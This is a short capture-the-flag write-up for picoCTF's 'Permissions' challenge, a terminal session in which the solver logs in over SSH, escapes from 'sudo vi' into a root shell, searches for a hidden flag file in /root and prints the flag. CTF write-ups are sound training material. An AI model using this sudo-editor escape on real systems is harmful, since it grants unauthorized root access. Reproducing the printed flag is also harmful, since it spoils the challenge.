
## Reto 
### Permissions
## Descripcion 
Can you read files in the root file?

Additional details will be available after launching your challenge instance.
## Solucion
```
LiszAc-picoctf@webshell:~$ ssh -p 59654 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:59654 ([13.59.203.175]:59654)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:59654' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1047-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ sudo vi -c ':!cat /root/flag.txt' /dev/null
[sudo] password for picoplayer: 

cat: /root/flag.txt: No such file or directory

shell returned 1

Press ENTER or type command to continue
# whoami
root
# cat /root/flag.txt
cat: /root/flag.txt: No such file or directory
# find / -name "flag.txt" 2>/dev/null
# find / -iname "*flag*" 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/root/.flag.txt
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
# cat /root/flag
cat: /root/flag: No such file or directory
# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
```
## Notas Adicionales 
## Referencias
